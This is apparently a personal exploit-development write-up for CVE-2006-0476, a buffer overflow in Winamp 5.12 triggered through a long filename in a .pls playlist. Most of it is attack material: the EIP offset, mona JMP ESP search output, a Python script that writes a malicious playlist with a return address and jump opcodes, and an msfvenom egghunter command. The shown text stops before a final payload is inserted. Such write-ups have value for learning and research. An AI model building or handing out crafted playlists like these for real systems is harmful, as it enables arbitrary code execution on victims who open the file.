# Winamp 5.12 Playlist Buffer Overflow
References: 
- https://www.exploit-db.com/exploits/1458
- https://packetstormsecurity.com/files/152706/Winamp-5.12-Playlist-.pls-Buffer-Overflow.html
- https://www.cvedetails.com/cve/CVE-2006-0476/ 
- https://resources.infosecinstitute.com/topic/buffer-overflow-vulnserver/#gref
- https://armoredcode.com/blog/a-closer-look-to-msf-egghunter/
  
*Buffer overflow in Nullsoft Winamp 5.12 allows remote attackers to execute arbitrary code via a playlist (pls) file with a long file name (File1 field).*

## Exploitation

### 1. Control EIP

PLS playlist structure as is follows:
```
[playlist]
File1=\Program Files\Winamp\demo.mp3 
Title1=DJ Mike Llama - Llama Whippin' Intro
Length1=5
NumberOfEntries=1
Version=2

```
The filename has to be long enough to overwrite the address of EIP. By sending increasingly longer inputs in as the filename, the length needed to control EIP is 1022, with the next 4 bytes on top of that being executed as the EIP address. 

![UI Screenshot](img/1.jpg)  

### 2. Find JMP ESP instruction
On the crash, ESP points to buffer space directly after EIP. Find a JMP ESP instruction:
```
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp

           ---------- Mona command started on 2020-12-22 16:29:07 (v2.0, rev 613) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 8 modules
0BADF00D       - Querying module jnetlib.w5s
0BADF00D       - Querying module in_wm.dll
0BADF00D       - Querying module in_nsv.dll
0BADF00D       - Querying module winamp.exe
0BADF00D       - Querying module gen_ff.dll
0BADF00D       - Querying module gen_ml.dll
0BADF00D       - Querying module aacPlusDecoder.w5s
0BADF00D       - Querying module in_mp3.dll
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile jmp.txt
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 2
0BADF00D       - Number of pointers of type 'call esp' : 2
0BADF00D       - Number of pointers of type 'push esp # ret ' : 20
0BADF00D       - Number of pointers of type 'push esp # ret 0x04' : 1
0BADF00D   [+] Results :
1A113749     0x1a113749 : jmp esp | ascii {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1A1E8C15     0x1a1e8c15 : jmp esp |  {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1073614F     0x1073614f : call esp | ascii {PAGE_EXECUTE_READ} [gen_ml.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ml.dll)
0202D961     0x0202d961 : call esp |  {PAGE_EXECUTE_READ} [in_mp3.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_mp3.dll)
66601B1D     0x66601b1d : push esp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
6660480C     0x6660480c : push esp # ret  | ascii {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
66604E65     0x66604e65 : push esp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
6660505E     0x6660505e : push esp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
666068A3     0x666068a3 : push esp # ret  |  {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
6660699A     0x6660699a : push esp # ret  |  {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
6660E2D1     0x6660e2d1 : push esp # ret  |  {PAGE_EXECUTE_READ} [in_wm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_wm.dll)
1501BAF6     0x1501baf6 : push esp # ret  |  {PAGE_EXECUTE_READ} [in_nsv.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\in_nsv.dll)
1A10539F     0x1a10539f : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1A17B88F     0x1a17b88f : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1A18C3D2     0x1a18c3d2 : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1A1CE776     0x1a1ce776 : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1A1F3067     0x1a1f3067 : push esp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [gen_ff.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ff.dll)
1072D056     0x1072d056 : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ml.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ml.dll)
1072D0A4     0x1072d0a4 : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ml.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ml.dll)
1072D0B7     0x1072d0b7 : push esp # ret  |  {PAGE_EXECUTE_READ} [gen_ml.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Winamp\Plugins\gen_ml.dll)
0BADF00D   ... Please wait while I'm processing all remaining results and writing everything to file...
0BADF00D   [+] Done. Only the first 20 pointers are shown here. For more pointers, open jmp.txt...
0BADF00D       Found a total of 25 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:07:22.697000
```
Of these, I can use the instruction at address: `0x1a1e8c15`.  
Exploit is now:
`[PADDING][JMP ESP][INTERRUPT]`
The interrupts are there to stop the program before it crashes again. Python exploit currently looks like:
```python
#!/usr/bin/env python

from struct import pack

plsPart1 = b'[playlist]\r\nFile1=\\\\'
plsFile1 = b'A' * 1022 + pack('<I', 0x1a1e8c15) + b'\xCC' * 4
plsPart2 = b'\r\nTitle1=LLamma Whippin\r\nLength1=5\r\nNumberOfEntries=1\r\nVersion=2\r\n'

with open('exp.pls', 'wb') as plsFile:
	plsFile.write(plsPart1 + plsFile1 + plsPart2)

```

![UI Screenshot](img/2.jpg)  

When running the resulting playlist file, the interrupts get hit, so we are now jumping to ESP and executing there, but this has only a small amount of space, only 11 bytes to the next null byte, so any useful shellcode payload is not going to fit. So from here another jump needs to happen back into the original filename buffer. This can be done first by decreasing the ESP pointer back onto the buffer and then jumping again.
```bash
┌──(kali㉿kali)-[/usr/share/metasploit-framework/tools/exploit]
└─$ ./nasm_shell.rb 
nasm > sub esp, 58
00000000  83EC3A            sub esp,byte +0x3a
nasm > jmp esp
00000000  FFE4              jmp esp
```
With the space I have, I can subtract 58 from ESP twice and then jump there. Modifications to exploit:
```python
subesp = b'\x83\xEC\x3A'
jmpesp = b'\xFF\xE4'

plsPart1 = b'[playlist]\r\nFile1=\\\\'
plsFile1 = b'A' * (906+4) + b'\xCC' * (116-4) + pack('<I', 0x1a1e8c15) + (subesp * 2) + jmpesp
plsPart2 = b'\r\nTitle1=LLamma Whippin\r\nLength1=5\r\nNumberOfEntries=1\r\nVersion=2\r\n'
```
I put some interrupts where the execution should jump to. Another interrupt back in the file buffer:

![UI Screenshot](img/3.jpg)  

Still not enough stack space for a payload, so from here use egghunter to jump again to a bigger area. Firstly generate some egghunter shellcode, needs to be passed to msfvenom to encode out badchars.
```bash
┌──(kali㉿kali)-[~]
└─$ msf-egghunter --arch x86 --platform windows -e JACK -f raw | msfvenom -p - --arch x86 --platform windows -e x86/alpha_mixed -f python --var-name egg > egghunt_encoded.py
Attempting to read payload from STDIN...

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/alpha_mixed
x86/alpha_mixed succeeded with size 126 (iteration=0)
x86/alpha_mixed chosen with final size 126
Payload size: 126 bytes
Final size of python file: 625 bytes
```

